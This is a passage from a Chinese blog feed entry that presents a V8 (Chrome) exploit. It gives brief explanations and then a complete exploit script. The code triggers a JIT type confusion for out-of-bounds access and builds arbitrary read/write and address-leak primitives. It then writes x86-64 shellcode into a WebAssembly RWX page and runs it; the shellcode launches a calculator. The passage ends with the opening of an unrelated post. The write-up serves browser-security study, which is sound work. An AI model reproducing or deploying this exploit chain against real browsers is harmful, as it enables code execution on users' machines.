class_">ByteToBigIntArray</span>(buf);</span><br><span class="line">    oobarray[<span class="number">22</span>] = mem.<span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(sc.<span class="property">length</span>));</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arbarray[i] = sc[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">istagged</span>(addr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(comphigh);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    <span class="keyword">let</span> result = arbarray[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead_nocomp</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">istagged</span>(addr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">    <span class="keyword">let</span> result = arbarray[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在取址的时候，baseptr取的是64位，external ptr取32位，直接把base ptr改成目标地址，external ptr改成0就能做到无视指针压缩。而我们读取到的地址一般都只有低32位，所以这里也写了有指针压缩版的任意地址读写。</p>
<p>有了任意地址读写，我们还需要泄露对象地址来做shellcode的执行，这里我们使用一个对象数组，通过越界读取其存储的指针来获取对象地址。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        oobarray = [<span class="number">1.1</span>];</span><br><span class="line">        arbarray = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="number">8</span>);</span><br><span class="line">        arbarray[<span class="number">0</span>] = <span class="number">0x1111111111111111n</span>;</span><br><span class="line">        arbarray[<span class="number">1</span>] = <span class="number">0x2222222222222222n</span>;</span><br><span class="line">        arbarray[<span class="number">2</span>] = <span class="number">0x3333333333333333n</span>;</span><br><span class="line">        arbarray[<span class="number">3</span>] = <span class="number">0x4444444444444444n</span>;</span><br><span class="line">        objleaker = &#123;</span><br><span class="line">            a : <span class="number">0xc00c</span>,   <span class="comment">//标志，用于调试的时候方便找到目标</span></span><br><span class="line">            b : oobarray  <span class="comment">//这里后面替换成需要泄露地址的对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    objleaker.<span class="property">b</span> = obj;</span><br><span class="line">    <span class="keyword">let</span> result = mem.<span class="title function_">f2i</span>(oobarray[<span class="number">28</span>])&gt;&gt;<span class="number">32n</span>; <span class="comment">//我们需要的地址只占读出来的高32位</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了任意地址读写和地址泄露，就可以通过wasm对象来创建RWX页，然后写入shellcode执行</p>
<p>RWX的地址存放的地方需要通过调试确定，方法为先确定wasm instance的地址，然后在它下面寻找RWX页的地址，一般偏移不会太大，我这里是+0x68的位置</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">let</span> f2 = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">let</span> instance_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]instance addr ==&gt; &quot;</span>+<span class="title function_">hex</span>(instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwxaddr = <span class="title function_">arbRead</span>(instance_addr+<span class="number">0x68n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]RWX page ==&gt; &quot;</span>+<span class="title function_">hex</span>(rwxaddr));</span><br><span class="line"><span class="keyword">let</span> shellcode=[<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">    <span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"><span class="title function_">arbWrite_nocomp</span>(rwxaddr,shellcode);</span><br><span class="line"><span class="title function_">f2</span>();</span><br></pre></td></tr></table></figure>


<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP:"></a>完整EXP:</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Memory</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span> = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">i64</span> = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">f2i</span>(<span class="params">val</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">i64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="params">val</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">i64</span>[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> mem = <span class="keyword">new</span> <span class="title class_">Memory</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>,,,,,,,,,,,,,,,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>]</span><br><span class="line"><span class="keyword">let</span> oobarray;</span><br><span class="line"><span class="keyword">let</span> arbarray; </span><br><span class="line"><span class="keyword">let</span> objleaker;</span><br><span class="line">a.<span class="title function_">pop</span>();</span><br><span class="line">a.<span class="title function_">pop</span>();</span><br><span class="line">a.<span class="title function_">pop</span>();</span><br><span class="line"><span class="variable constant_">ITERATIONS</span> = <span class="number">10000</span>;</span><br><span class="line"><span class="variable constant_">TRIGGER</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">empty</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">p</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    a.<span class="title function_">push</span>(<span class="title function_">typeof</span>(<span class="title class_">Reflect</span>.<span class="title function_">construct</span>(empty, <span class="variable language_">arguments</span>, p)) === <span class="title class_">Proxy</span>?<span class="number">0.2</span>:<span class="number">156842065920.05</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">0x3003</span>;i++)&#123;<span class="title function_">empty</span>()&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        oobarray = [<span class="number">1.1</span>];</span><br><span class="line">        arbarray = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="number">8</span>);</span><br><span class="line">        arbarray[<span class="number">0</span>] = <span class="number">0x1111111111111111n</span>;</span><br><span class="line">        arbarray[<span class="number">1</span>] = <span class="number">0x2222222222222222n</span>;</span><br><span class="line">        arbarray[<span class="number">2</span>] = <span class="number">0x3333333333333333n</span>;</span><br><span class="line">        arbarray[<span class="number">3</span>] = <span class="number">0x4444444444444444n</span>;</span><br><span class="line">        objleaker = &#123;</span><br><span class="line">            a : <span class="number">0xc00c</span>,</span><br><span class="line">            b : oobarray</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">exp</span>(<span class="params">nt</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">0x3003</span>;i++)<span class="title function_">empty</span>();</span><br><span class="line">    <span class="title function_">f</span>(nt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">exp</span>(empty);</span><br><span class="line"><span class="title function_">exp</span>(empty);</span><br><span class="line"><span class="title function_">exp</span>(p);</span><br><span class="line"><span class="keyword">let</span> len = mem.<span class="title function_">f2i</span>(oobarray[<span class="number">22</span>]);</span><br><span class="line"><span class="keyword">let</span> baseptr = mem.<span class="title function_">f2i</span>(oobarray[<span class="number">23</span>]);</span><br><span class="line"><span class="keyword">let</span> exptr = mem.<span class="title function_">f2i</span>(oobarray[<span class="number">24</span>]);</span><br><span class="line"><span class="keyword">let</span> comphigh = baseptr &amp; <span class="number">0xffffffff00000000n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]array len ==&gt; &quot;</span>+<span class="title function_">hex</span>(len));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]array baseptr ==&gt; &quot;</span>+<span class="title function_">hex</span>(baseptr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]array exptr ==&gt; &quot;</span>+<span class="title function_">hex</span>(exptr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]high addr ==&gt; &quot;</span>+<span class="title function_">hex</span>(comphigh));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    objleaker.<span class="property">b</span> = obj;</span><br><span class="line">    <span class="keyword">let</span> result = mem.<span class="title function_">f2i</span>(oobarray[<span class="number">28</span>])&gt;&gt;<span class="number">32n</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">istagged</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="title class_">Number</span>(addr);</span><br><span class="line">    <span class="keyword">if</span>(tmp &amp; <span class="number">1</span> != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ByteToBigIntArray</span>(<span class="params">payload</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> sc = []</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="number">0n</span>;</span><br><span class="line">    <span class="keyword">let</span> lenInt = <span class="title class_">BigInt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(payload.<span class="property">length</span>/<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0n</span>; i &lt; lenInt; i += <span class="number">1n</span>) &#123;</span><br><span class="line">        tmp = <span class="number">0n</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0n</span>; j&lt;<span class="number">8n</span>; j++)&#123;</span><br><span class="line">            tmp += <span class="title class_">BigInt</span>(payload[i*<span class="number">8n</span>+j])*(<span class="number">0x1n</span>&lt;&lt;(<span class="number">8n</span>*j));</span><br><span class="line">        &#125;</span><br><span class="line">        sc.<span class="title function_">push</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> len = payload.<span class="property">length</span>%<span class="number">8</span>;</span><br><span class="line">    tmp = <span class="number">0n</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0n</span>; i&lt;len; i++)&#123;</span><br><span class="line">        tmp += <span class="title class_">BigInt</span>(payload[lenInt*<span class="number">8n</span>+i])*(<span class="number">0x1n</span>&lt;&lt;(<span class="number">8n</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    sc.<span class="title function_">push</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> sc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr,buf</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sc = <span class="title class_">ByteToBigIntArray</span>(buf);</span><br><span class="line">    oobarray[<span class="number">22</span>] = mem.<span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(sc.<span class="property">length</span>));</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(comphigh);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arbarray[i] = sc[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite_nocomp</span>(<span class="params">addr,buf</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sc = <span class="title class_">ByteToBigIntArray</span>(buf);</span><br><span class="line">    oobarray[<span class="number">22</span>] = mem.<span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(sc.<span class="property">length</span>));</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arbarray[i] = sc[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">istagged</span>(addr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(comphigh);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    <span class="keyword">let</span> result = arbarray[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead_nocomp</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">istagged</span>(addr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">    <span class="keyword">let</span> result = arbarray[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">let</span> f2 = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">let</span> instance_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]instance addr ==&gt; &quot;</span>+<span class="title function_">hex</span>(instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwxaddr = <span class="title function_">arbRead</span>(instance_addr+<span class="number">0x68n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]RWX page ==&gt; &quot;</span>+<span class="title function_">hex</span>(rwxaddr));</span><br><span class="line"><span class="keyword">let</span> shellcode=[<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">    <span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"><span class="title function_">arbWrite_nocomp</span>(rwxaddr,shellcode);</span><br><span class="line"><span class="title function_">f2</span>();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>chrome pwn</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>HALucinator:Firmware Re-hosting Through Abstraction Layer Emulation 笔记</title>
    <url>/halucinator/</url>
